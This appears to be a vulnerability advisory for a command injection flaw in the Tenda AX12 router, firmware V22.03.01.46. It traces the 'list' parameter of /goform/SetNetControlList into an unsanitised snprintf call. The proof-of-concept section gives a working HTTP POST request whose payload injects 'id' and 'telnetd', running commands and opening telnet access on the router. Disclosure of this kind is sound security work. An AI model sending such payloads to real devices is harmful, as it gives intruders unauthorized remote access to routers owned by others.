# Tenda AX12 Command injection vulnerability

## Firmware information

Firmware download address ：https://www.tenda.com.cn/download/detail-3621.html

## Affected version

Tenda AX12 V22.03.01.46

## Vulnerability details

![image-20231122104054903](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231122104054903.png)

![image-20231124010131506](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231124010131506.png)



![image-20231124005930864](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231124005930864.png)



In the `/goform/SetNetControlList` function, the `list` parameter is passed to `sscanf` without validation and then further passed to `add_tc_traffic_control`, a function defined in `libtd_server.so`. Inside this function, command concatenation occurs in `snprintf`, leading to command injection.

## Poc

```http
POST /goform/SetNetControlList HTTP/1.1
Host: 192.168.3.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 43
Origin: http://192.168.3.2
Connection: close

list=1111%0d;id;telnetd;%0d33333%0d4444%0a
```

![image-20231124010323949](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231124010323949.png)

## Author

E4L4@TalentSec Co.,Ltd